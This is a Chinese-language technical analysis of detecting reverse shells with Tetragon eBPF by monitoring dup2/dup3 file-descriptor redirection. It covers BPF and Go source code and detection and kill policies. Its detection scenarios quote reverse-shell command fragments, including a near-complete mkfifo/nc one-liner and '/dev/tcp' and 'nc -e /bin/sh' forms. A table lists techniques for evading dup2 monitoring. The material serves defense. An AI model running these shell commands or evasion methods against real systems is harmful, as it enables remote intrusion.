# Tetragon 反弹 Shell 检测 — FD 重定向维度深度分析

## 文档定位

本文档是「Tetragon 反弹 Shell 检测全流程深度分析」系列的第 3 篇（FD 重定向维度），覆盖通过 dup2/dup3 监控检测反弹 Shell 核心特征（将 socket fd 重定向到 stdin/stdout/stderr）的全链路分析。

> **前置阅读**: [Doc 0: 基础架构](tetragon-reverse-shell-detection-foundation.md) — Kprobe 框架、Action 执行框架（特别是 §2.4 FollowFD/CopyFD/NotifyEnforcer）。

**覆盖的反弹 Shell 类型**：Bash `exec 5<>/dev/tcp`、Python `os.dup2()`、Perl `open(STDIN,">&S")`、所有使用 dup 系列系统调用的反弹 Shell。

---

## 目录

- [第一部分：FD 重定向在反弹 Shell 中的角色](#第一部分fd-重定向在反弹-shell-中的角色)
- [第二部分：eBPF 内核层源码分析](#第二部分ebpf-内核层源码分析)
- [第三部分：Go 应用层源码分析](#第三部分go-应用层源码分析)
- [第四部分：实战场景与策略](#第四部分实战场景与策略)
- [第五部分：绕过分析与对策](#第五部分绕过分析与对策)

---

## 第一部分：FD 重定向在反弹 Shell 中的角色

### 1.1 FD 重定向模型

反弹 Shell 的核心操作是将网络 socket 的文件描述符重定向到标准输入/输出/错误（fd 0/1/2），使远程攻击者能够通过网络连接直接与 Shell 交互：

```
正常进程:                              反弹 Shell:
─────────                             ──────────
fd 0 (stdin)  ← 终端 /dev/pts/0       fd 0 (stdin)  ← socket (网络)
fd 1 (stdout) → 终端 /dev/pts/0       fd 1 (stdout) → socket (网络)
fd 2 (stderr) → 终端 /dev/pts/0       fd 2 (stderr) → socket (网络)
fd 3           → 可能的文件等            fd 5           → socket (原始连接)

                                       dup2(5, 0)  // socket → stdin
                                       dup2(5, 1)  // socket → stdout
                                       dup2(5, 2)  // socket → stderr
```

### 1.2 各��反弹 Shell 的 FD 行为对比

| 反弹 Shell 类型 | FD 操作方式 | 可通过 dup2 监控检测 |
|----------------|-----------|:---:|
| `bash -i >& /dev/tcp/...` | Bash 内建 `/dev/tcp` + Shell 重定向 `>&` `0>&1` | ⚠️ Bash 内建，不直接调用 dup2 |
| `bash -c 'exec 5<>/dev/tcp/...'` | Bash `exec` 重定向 | ⚠️ Bash 内建 |
| Python `os.dup2(s.fileno(),0)` | 显式调用 dup2 系统调用 | ✅ |
| Perl `open(STDIN,">&S")` | Perl 内部调用 dup2 | ✅ |
| `nc -e /bin/sh` | nc 内部处理 FD | ❌ nc 不使用 dup2 |
| 自定义 C 代码 `dup2(sock,0)` | 直接系统调用 | ✅ |
| PHP `$proc = proc_open(...)` | PHP 内部处理 | ⚠️ 取决于实现 |

### 1.3 Linux FD 系统调用体系

| 系统调用 | 原型 | 功能 |
|---------|------|------|
| `dup(oldfd)` | `int dup(int oldfd)` | 复制 FD 到最小可用号 |
| `dup2(oldfd, newfd)` | `int dup2(int oldfd, int newfd)` | 复制 FD 到指定号 |
| `dup3(oldfd, newfd, flags)` | `int dup3(int oldfd, int newfd, int flags)` | 同 dup2 + O_CLOEXEC |
| `fcntl(fd, F_DUPFD, arg)` | `int fcntl(int fd, int cmd, ...)` | 复制 FD 到 >= arg 的最小可用号 |

**反弹 Shell 关注��**: `dup2` 和 `dup3` 是最常用的 FD 重定向调用，因为它们允许指定目标 FD 号（0/1/2）。

---

## 第二部分：eBPF 内核层源码分析

### 2.1 监控 sys_dup/sys_dup2/sys_dup3

通过 Generic Kprobe 框架，可以挂钩 dup 系列系统调用并捕获其参数：

```yaml
# 监控 dup2 系统调用
kprobes:
- call: "sys_dup2"        # 或 "__sys_dup2" 取决于内核版本
  syscall: true
  args:
  - index: 0
    type: "int"           # oldfd
  - index: 1
    type: "int"           # newfd
```

参数在 BPF 侧以 `int_type` 读取：

**源码位置**: `bpf/process/generic_calls.h:300-305`

```c
case int_type:
case s32_ty:
case u32_ty:
    probe_read(args, sizeof(__u32), &arg);
    size = sizeof(__u32);
    break;
```

对于 `int` 类型参数的 matchArgs 过滤，使用 `filter_32ty_map()` 或 `filter_32ty_selector_val()`：

```c
// 在选择器编译后的过滤器中
// matchArgs: {index: 1, operator: "Equal", values: ["0", "1", "2"]}
// 编译为 filter_32ty_map 调用，在 argfilter_maps 中查找
```

### 2.2 FollowFD Action

FollowFD 是 Tetragon 的 FD 跟踪机制。当 `fd_install` 被调用（内核将文件描述符安装到进程 FD 表中）时，通过 FollowFD Action 将 FD 号和关联的文件路径存入 `fdinstall_map`。

**installfd() 函数**: `bpf/process/types/basic.h:2212-2267`

```c
FUNC_INLINE int
installfd(struct msg_generic_kprobe *e, int fd, int name, bool follow)
{
    struct fdinstall_key key = { 0 };
    struct fdinstall_value *val;
    int zero = 0;

    val = map_lookup_elem(&heap, &zero);
    if (!val)
        return 0;

    // 获取 FD 参数的偏移（从事件 args 缓冲区中）
    fdoff = e->argsoff[fd];
    key.fd = *(__u32 *)&e->args[fdoff];     // 读取实际 FD 号
    key.tid = get_current_pid_tgid() >> 32;  // 进程 PID

    if (follow) {
        // FollowFD: 将 FD 对应的文件路径写入 fdinstall_map
        nameoff = e->argsoff[name];
        size = *(__u32 *)&e->args[nameoff];  // 路径长度

        // 复制路径数据（包含长度 + 路径字符串 + flags）
        probe_read(&val->file[0], size + 4 + 4, &e->args[nameoff]);

        // 写入 Map: key={pid, fd} → value={file_path}
        map_update_elem(&fdinstall_map, &key, val, BPF_ANY);
    } else {
        // UnfollowFD: 删除 FD 跟踪
        map_delete_elem(&fdinstall_map, &key);
    }
    return err;
}
```

**数据结构**: `bpf/process/types/basic.h:2195-2210`

```c
struct fdinstall_key {
    __u64 tid;      // 进程 PID (tgid)
    __u32 fd;       // 文件描述符号
    __u32 pad;
};

struct fdinstall_value {
    char file[4104]; // 4096B 路径 + 4B 长度 + 4B flags
};

// fdinstall_map: LRU Hash Map
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 1);  // Agent 动态调整大小
    __type(key, struct fdinstall_key);
    __type(value, struct fdinstall_value);
} fdinstall_map SEC(".maps");
```

**FollowFD 的典型使用场景**: 在 `fd_install` Hook 中跟踪文件打开操作，然后在后续的 dup2 调用中使用 CopyFD 传播文件信息。

### 2.3 CopyFD Action

CopyFD 将一个 FD 的跟踪元数据（文件路径信息）复制到另一个 FD。这正是 dup2 检测的核心机制。

**copyfd() 函数**: `bpf/process/types/basic.h:2283-2323`

```c
FUNC_INLINE int
copyfd(struct msg_generic_kprobe *e, int oldfd, int newfd)
{
    struct fdinstall_key key = { 0 };
    struct fdinstall_value *val;

    // 1. 获取 oldfd 参数的值
    oldfdoff = e->argsoff[oldfd];
    key.fd = *(__u32 *)&e->args[oldfdoff];   // 原始 FD 号
    key.tid = get_current_pid_tgid() >> 32;

    // 2. 从 fdinstall_map 查找 oldfd 的文件信息
    val = map_lookup_elem(&fdinstall_map, &key);
    if (val) {
        // 3. 获取 newfd 参数的值
        newfdoff = e->argsoff[newfd];
        key.fd = *(__u32 *)&e->args[newfdoff]; // 目标 FD 号
        key.tid = get_current_pid_tgid() >> 32;

        // 4. 将 oldfd 的文件信息复制到 newfd
        map_update_elem(&fdinstall_map, &key, val, BPF_ANY);
    }

    return err;
}
```

**CopyFD 工作流程**:

```
fd_install(fd=5, file="/dev/tcp/...")
    │ FollowFD action: fdinstall_map[{pid, 5}] = "/dev/tcp/..."
    │
    ▼
dup2(oldfd=5, newfd=0)
    │ CopyFD action: val = fdinstall_map[{pid, 5}]
    │                fdinstall_map[{pid, 0}] = val
    │ 事件包含: oldfd=5, newfd=0
    │
    ▼
dup2(oldfd=5, newfd=1)
    │ CopyFD action: fdinstall_map[{pid, 1}] = val
    │
    ▼
dup2(oldfd=5, newfd=2)
    │ CopyFD action: fdinstall_map[{pid, 2}] = val
    │
    ▼ 此时 fd 0/1/2 都指向 socket
```

### 2.4 Enforcer 机制

Enforcer 提供了在被监控函数执行时（而非之后）阻断操作的能力。对于 dup2 检测，NotifyEnforcer 可以在 dup2 系统调用执行前发送信号杀死进程。

**源码位置**: `bpf/process/bpf_enforcer.c:6-20`

```c
FUNC_INLINE int do_enforcer(void *ctx)
{
    __u64 id = get_current_pid_tgid();
    struct enforcer_data *data;

    // 从 enforcer_data Map 查找当前线程的 enforcer 通知
    data = map_lookup_elem(&enforcer_data, &id);
    if (!data)
        return 0;

    // 发送信号（如 SIGKILL）
    if (data->signal)
        send_signal(data->signal);

    map_delete_elem(&enforcer_data, &id);
    return data->error;  // 通过 fmod_ret 返回错误码
}
```

**do_action_notify_enforcer**: `bpf/process/generic_calls.h:1133-1142`

```c
case ACTION_NOTIFY_ENFORCER:
    error = actions->act[++i];   // 错误码
    signal = actions->act[++i];  // 信号
    argi = actions->act[++i];    // 参数索引
    if (enforce_mode) {
        do_action_notify_enforcer(e, error, signal, argi);
        // → 将 {error, signal} 写入 enforcer_data Map
        // → Enforcer BPF 程序在被监控函数入口处检查此 Map
        polacct = POLICY_NOTIFY_ENFORCER;
    }
    break;
```

**Enforcer 的两种实现**: `bpf/process/bpf_enforcer.c:22-55`

```c
// 方式 1: 使用 BPF_OVERRIDE_RETURN（kprobe.multi/enforcer）
// 适用于支持 CONFIG_BPF_KPROBE_OVERRIDE 的内核
__attribute__((section("kprobe/enforcer"), used)) int
kprobe_enforcer(void *ctx) {
    long ret = do_enforcer(ctx);
    if (ret)
        override_return(ctx, ret);  // 修改函数返回值
    return 0;
}

// 方式 2: 使用 fmod_ret（功能修改返回值）
// 适用于支持 BPF_MODIFY_RETURN 的内核
__attribute__((section("fmod_ret/security_task_prctl"), used)) long
fmodret_enforcer(void *ctx) {
    return do_enforcer(ctx);  // 返回非零值阻止函数执行
}
```

**Enforcer 完整工作流程（killer.yaml 模式）**:

```
TracingPolicy 配置:
    enforcers:
    - calls: ["list:dups"]     ← Enforcer 挂钩的系统调用列表
    tracepoints:
    - subsystem: "raw_syscalls"
      event: "sys_enter"
      args: [{index: 4, type: "syscall64"}]
      selectors:
      - matchArgs:
        - index: 0
          operator: "InMap"
          values: ["list:dups"]
        matchBinaries:
        - operator: "In"
          values: ["/usr/bin/bash"]
        matchActions:
        - action: "NotifyEnforcer"
          argError: -1          ← 返回 -EPERM
          argSig: 9             ← SIGKILL

执行流程:
    1. bash 调用 dup2(5, 0)
    2. raw_syscalls/sys_enter Tracepoint 触发
    3. matchArgs: syscall_nr ∈ {sys_dup, sys_dup2} ← InMap 匹配
    4. matchBinaries: "/usr/bin/bash" ← In 匹配
    5. NotifyEnforcer action:
       enforcer_data[current_pid_tgid] = {error=-1, signal=9}
    6. sys_dup2 内核函数入口 → Enforcer kprobe 触发
    7. do_enforcer():
       a. 查找 enforcer_data → 找到 {-1, 9}
       b. send_signal(9) → 发送 SIGKILL
       c. override_return(ctx, -1) → 返回 -EPERM
    8. bash 被 SIGKILL 终止
```

---

## 第三部分：Go 应用层源码分析

### 3.1 FD 类型参数解析

当 Generic Kprobe 事件包含 `fd_ty` 类型参数时，Go 侧的解析逻辑：

**BPF 侧 fd_ty 读取**: `bpf/process/generic_calls.h:238-269`

```c
case fd_ty: {
    struct fdinstall_key key = { 0 };
    struct fdinstall_value *val;
    __u32 fd;

    key.tid = get_current_pid_tgid() >> 32;
    probe_read(&fd, sizeof(__u32), &arg);
    key.fd = fd;

    // 从 fdinstall_map 查找 FD 对应的文件路径
    val = map_lookup_elem(&fdinstall_map, &key);
    if (val) {
        // 输出: fd号 + 文件路径信息
        probe_read(&args[0], sizeof(__u32), &fd);
        probe_read(&args[4], bytes + 4, (char *)&val->file[0]);
        size = bytes + 4 + 4;
        // flags
        probe_read(&args[size], 4, (char *)&val->file[size - 4]);
        size += 4;
    } else {
        // FD 未被 FollowFD 跟踪 → 丢弃事件
        return -1;
    }
}
```

**Go 侧解析**:

```
handleGenericKprobe():
    │ 参数类型为 gt.GenericFdType:
    │   1. 读取 4 字节 FD 号
    │   2. 读取关联的文件路径（来自 fdinstall_map）
    │   3. 读取 flags
    │   → 构建 {fd: N, path: "/dev/tcp/...", flags: ...}
```

### 3.2 FollowFD/CopyFD Action 编译

**Go 侧**: `pkg/selectors/kernel.go`

```go
// FollowFd action 编译
case ActionTypeFollowFd:
    // argFd: FD 参数索引（哪个参数是 FD 号）
    // argName: 名称参数索引（哪个参数是文件路径）
    act.ArgFd    // → actions->act[i+1] = fdi
    act.ArgName  // → actions->act[i+2] = namei

// CopyFd action 编译
case ActionTypeCopyFd:
    // argOldFd: 旧 FD 参数索引
    // argNewFd: 新 FD 参数索引
    act.ArgFd    // → actions->act[i+1] = oldfdi
    act.ArgName  // → actions->act[i+2] = newfdi
```

### 3.3 Enforcer Action 编译

```go
// NotifyEnforcer action 编译
case ActionTypeNotifyEnforcer:
    act.ArgError // → actions->act[i+1] = error 错误码
    act.ArgSig   // → actions->act[i+2] = signal 信号
    // → actions->act[i+3] = argi 参数索引
```

Enforcer 的特殊之处在于它需要额外的 BPF 程序加载。Go 侧在处理 `enforcers` 配置时：

1. 解析 `enforcers.calls` 列表中的系统调用名
2. 加载 `bpf_enforcer.c` 编译的 BPF 程序
3. 将 Enforcer 程序附加到指定的系统调用入口
4. 共享 `enforcer_data` Map

---

## 第四部分：实战场景与策略

### 4.1 检测 dup2(socket_fd, 0/1/2)

**场景**: 检测将任何 FD 重定向到 stdin(0)/stdout(1)/stderr(2) 的行为。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-fd-redirection"
spec:
  kprobes:
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "int"     # oldfd
    - index: 1
      type: "int"     # newfd
    selectors:
    # 检测 newfd 为 0、1 或 2（stdin/stdout/stderr）
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"    # stdin
        - "1"    # stdout
        - "2"    # stderr
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/sh"
        - "/bin/sh"
        - "/usr/bin/python3"
        - "/usr/bin/perl"
        - "/usr/bin/php"

  - call: "sys_dup3"
    syscall: true
    args:
    - index: 0
      type: "int"     # oldfd
    - index: 1
      type: "int"     # newfd
    - index: 2
      type: "int"     # flags
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/python3"
```

**事件观察**:

```bash
# 检测 FD 重定向到 stdin/stdout/stderr
tetra getevents -o json | jq '
  select(.process_kprobe != null)
  | select(.process_kprobe.function_name | test("dup[23]"))
  | {
      time: .time,
      binary: .process_kprobe.process.binary,
      pid: .process_kprobe.process.pid.value,
      function: .process_kprobe.function_name,
      oldfd: .process_kprobe.args[0].int_arg.value,
      newfd: .process_kprobe.args[1].int_arg.value,
      action: .process_kprobe.action
    }'
```

### 4.2 Enforcer 杀死执行 dup2 的进程

**场景**: 在 bash 执行 dup 系列系统调用时直接杀死进程。

**策略文件**: 基于 `examples/tracingpolicy/killer.yaml`

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "kill-dup-in-bash"
spec:
  # 1. 定义系统调用列表
  lists:
  - name: "dups"
    type: "syscalls"
    values:
    - "sys_dup"
    - "sys_dup2"
    - "__ia32_sys_dup"

  # 2. 定义 Enforcer（挂钩到 dup 系统调用入口）
  enforcers:
  - calls:
    - "list:dups"

  # 3. 使用 Tracepoint 检测并触发 Enforcer
  tracepoints:
  - subsystem: "raw_syscalls"
    event: "sys_enter"
    args:
    - index: 4
      type: "syscall64"
    selectors:
    - matchArgs:
      - index: 0
        operator: "InMap"
        values:
        - "list:dups"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
      matchActions:
      - action: "NotifyEnforcer"
        argError: -1       # 返回 -EPERM
        argSig: 9          # SIGKILL
```

**工作原理**:

1. `lists` 定义了要监控的系统调用集合（sys_dup, sys_dup2）
2. `enforcers` 将 Enforcer BPF 程序附加到这些系统调用的入口
3. `tracepoints` 监控 `raw_syscalls/sys_enter`，使用 `InMap` 操作符检查系统调用号是否在列表中
4. 匹配 bash 进程 + dup 系统调用时，`NotifyEnforcer` 向 `enforcer_data` Map 写入信号
5. 系统调用入口的 Enforcer 程序读取 Map，发送 SIGKILL 并返回错误

### 4.3 检测 mkfifo + FD 管道链

**场景**: `mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f`

这种反弹 Shell 不使用 dup2，而是通过 named pipe（FIFO）连接 nc 和 shell。需要结合文件访问维度（Doc 4）监控 mkfifo：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-mkfifo-pipe"
spec:
  kprobes:
  - call: "sys_mknodat"
    syscall: true
    args:
    - index: 1
      type: "string"     # pathname
    - index: 2
      type: "int"        # mode
    selectors:
    - matchArgs:
      - index: 2
        operator: "Mask"
        values:
        - "4096"          # S_IFIFO = 0010000 = 4096
```

### 4.4 检测 fcntl F_DUPFD

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-fcntl-dupfd"
spec:
  kprobes:
  - call: "sys_fcntl"
    syscall: true
    args:
    - index: 0
      type: "int"     # fd
    - index: 1
      type: "int"     # cmd
    - index: 2
      type: "int"     # arg
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"          # F_DUPFD = 0
```

### 4.5 FD + Network 联合策略

**高置信度检测**: 将 FD 重定向与网络连接关联，检测 "socket fd → stdin/stdout" 的完整行为链。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-reverse-shell-fd-network"
spec:
  kprobes:
  # 1. 跟踪 fd_install（FD 创建，记录 FD→文件映射）
  - call: "fd_install"
    syscall: false
    args:
    - index: 0
      type: "int"       # fd 号
    - index: 1
      type: "file"      # 关联的文件
    selectors:
    - matchActions:
      - action: "FollowFD"
        argFd: 0         # FD 参数是第 0 个参数
        argName: 1        # 文件路径是第 1 个参数
      - action: "NoPost"  # 创建时不发送事件

  # 2. 监控 dup2 并使用 CopyFD 传播文件信息
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "fd"         # oldfd（使用 fd 类型，会查找 fdinstall_map）
    - index: 1
      type: "int"        # newfd
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"
      matchActions:
      - action: "CopyFD"
        argFd: 0          # oldfd 参数索引
        argName: 1         # newfd 参数索引

  # 3. 同时监控外连（用于关联）
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
```

**用户空间关联分析**:

```bash
# 关联 tcp_connect 和 dup2 事件（同一 PID）
tetra getevents -o json | jq '
  if .process_kprobe.function_name == "tcp_connect" then
    {type: "CONNECT", pid: .process_kprobe.process.pid.value,
     binary: .process_kprobe.process.binary,
     daddr: .process_kprobe.args[0].sock_arg.daddr,
     dport: .process_kprobe.args[0].sock_arg.dport}
  elif (.process_kprobe.function_name | test("dup")) then
    {type: "DUP", pid: .process_kprobe.process.pid.value,
     binary: .process_kprobe.process.binary,
     oldfd: .process_kprobe.args[0].int_arg.value,
     newfd: .process_kprobe.args[1].int_arg.value}
  else empty end'
```

---

## 第五部分：绕过分析与对策

### 5.1 绕过技术

| 绕过技术 | 原理 | 能否绕过 dup2 监控 |
|---------|------|:---:|
| **Bash /dev/tcp 内建** | Bash 内部处理 FD 重定向，不一定调用 dup2 | ⚠️ 部分绕过 |
| **sendmsg SCM_RIGHTS** | 通过 Unix Socket 传递 FD | ✅ 绕过 dup2 监控 |
| **splice()** | 在内核空间直接连接两个 FD 的数据流 | ✅ 绕过 dup2 监控 |
| **PTY 层** | 使用伪终端 (pty) 替代直接 FD 重定向 | ✅ 绕过 dup2 监控 |
| **mmap + 共享内存** | 通过共享内存而非 FD 传递数据 | ✅ 绕过 FD 监控 |
| **io_uring** | 使用 io_uring 异步 I/O 替代传统 read/write | ✅ 绕过 FD 监控 |

### 5.2 对策

#### 5.2.1 多系统调用监控

除了 dup2/dup3，还应监控其他可能的 FD 操作：

```yaml
# 监控多种 FD 操作系统调用
lists:
- name: "fd-ops"
  type: "syscalls"
  values:
  - "sys_dup"
  - "sys_dup2"
  - "sys_dup3"
  - "sys_fcntl"       # F_DUPFD
```

#### 5.2.2 联合进程维度

即使 FD 重定向被绕过（如 Bash 内建），进程执行维度仍可检测 bash 的启动和参数：

- `bash -i >& /dev/tcp/...` → execve 检测参数中的 `/dev/tcp`
- `python3 -c 'import socket...'` → execve 检测参数中的 `socket`

#### 5.2.3 splice/sendmsg Hooks

对于 splice() 和 sendmsg(SCM_RIGHTS) 的绕过，可以添加额外的 Kprobe：

```yaml
# 监控 splice（内核空间 FD 数据转发）
kprobes:
- call: "sys_splice"
  syscall: true
  args:
  - index: 0
    type: "int"     # fd_in
  - index: 2
    type: "int"     # fd_out
  - index: 4
    type: "int"     # len

# 监控 sendmsg（可能传递 FD）
- call: "sys_sendmsg"
  syscall: true
  args:
  - index: 0
    type: "int"     # sockfd
```

#### 5.2.4 综合策略

FD 重定向检测是反弹 Shell 检测的高置信度信号，但不能单独依赖。结合网络连接维度（Doc 2）形成 "网络连接 + FD 重定向" 的双重检测是最有效的方案（详见 Doc 5）。

**检测优先级建议**:

1. **最高置信度**: tcp_connect(外网) + dup2(socket→0/1/2) 同 PID → 确认反弹 Shell
2. **高置信度**: Shell/解释器 execve + tcp_connect(外网) → 高度可疑
3. **中等置信度**: 仅 dup2(→0/1/2) 或仅 tcp_connect(外网) → 需人工确认
